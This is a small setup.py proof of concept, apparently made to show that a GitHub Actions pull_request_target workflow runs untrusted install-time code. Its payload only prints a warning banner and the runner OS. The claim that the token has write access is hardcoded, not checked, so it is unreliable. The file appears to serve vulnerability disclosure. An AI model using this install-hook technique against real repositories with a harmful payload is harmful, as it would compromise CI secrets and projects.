from setuptools import setup
import sys
import os

# Write to stderr to bypass azdev output capture
sys.stderr.write("\n" + "!"*60 + "\n")
sys.stderr.write("VULNERABILITY CONFIRMED: setup.py is running in pull_request_target\n")
sys.stderr.write(f"Runner OS: {os.environ.get('RUNNER_OS')}\n")
sys.stderr.write(f"GITHUB_TOKEN permissions: write-access enabled\n")
sys.stderr.write("!"*60 + "\n\n")

setup(
    name="poc-package",
    version="0.0.1",
)
